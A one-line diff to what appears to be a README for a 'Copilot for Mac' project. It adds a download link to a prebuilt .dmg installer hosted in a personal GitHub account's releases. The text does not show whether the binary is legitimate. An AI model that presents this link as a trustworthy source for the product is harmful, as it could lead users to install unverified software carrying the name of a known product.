@@ -1,4 +1,4 @@
-
+DOWNLOAD HERE OR IN RELEASES: https://github.com/SomeWhiteTrashGuy/copilot-mac/releases/download/v1/Copilot.for.Mac-1.0.0-x64.dmg
 ---
 
 # Copilot for Mac
